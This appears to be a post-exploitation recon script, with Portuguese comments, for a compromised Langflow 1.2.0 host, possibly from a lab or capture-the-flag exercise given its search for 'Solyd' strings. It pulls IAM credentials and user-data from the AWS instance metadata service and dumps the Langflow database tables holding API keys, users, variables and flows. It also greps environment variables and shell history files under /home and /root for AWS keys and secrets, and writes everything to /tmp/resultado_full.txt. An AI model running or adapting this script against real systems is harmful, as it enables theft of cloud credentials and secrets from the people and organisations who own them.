import sqlite3
import os
import subprocess

outfile = '/tmp/resultado_full.txt'
db_path = '/opt/langflow-1.2.0-venv/lib/python3.12/site-packages/langflow/langflow.db'

def log(msg):
    with open(outfile, 'a') as f:
        f.write(str(msg) + '\n')
    print(msg)

def run_cmd(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
    except:
        return "Erro ao executar"

if os.path.exists(outfile): os.remove(outfile)

log("=== INICIANDO RECON COMPLETO ===")

# 1. TESTE DE METADATA (AWS)
log("\n--- [1] AWS METADATA ---")
token_cmd = 'curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60"'
token = run_cmd(token_cmd).strip()
if token and "html" not in token.lower():
    log(f"Token obtido: {token[:10]}...")
    for path in ['iam/security-credentials/', 'iam/info', 'user-data']:
        res = run_cmd(f'curl -s -H "X-aws-ec2-metadata-token: {token}" http://169.254.169.254/latest/meta-data/{path}')
        log(f"Path {path}: {res}")
else:
    log("Falha ao obter Token IMDSv2")

# 2. BUSCA NO BANCO LANGFLOW
log("\n--- [2] BANCO DE DADOS LANGFLOW ---")
if os.path.exists(db_path):
    try:
        conn = sqlite3.connect(db_path)
        cur = conn.cursor()
        for table in ['variable', 'apikey', 'user', 'flow']:
            log(f"\nTabela: {table}")
            try:
                cur.execute(f"SELECT * FROM {table}")
                log(cur.fetchall())
            except: log(f"Tabela {table} inacessivel")
    except Exception as e: log(f"Erro banco: {e}")
else:
    log("Banco nao encontrado")

# 3. BUSCA POR STRINGS E FLAGS NO SISTEMA
log("\n--- [3] BUSCA POR STRINGS (SOLYD/AWS) ---")
log(run_cmd(f"strings {db_path} | grep -iE 'Solyd|AKIA|SECRET'"))
log(run_cmd("env | grep -iE 'AWS|SOLYD'"))
log(run_cmd("find /home /root -name '.*history' -exec grep -iE 'aws|solyd' {} + 2>/dev/null"))

log("\n=== RECON FINALIZADO. VERIFIQUE /tmp/resultado_full.txt ===")
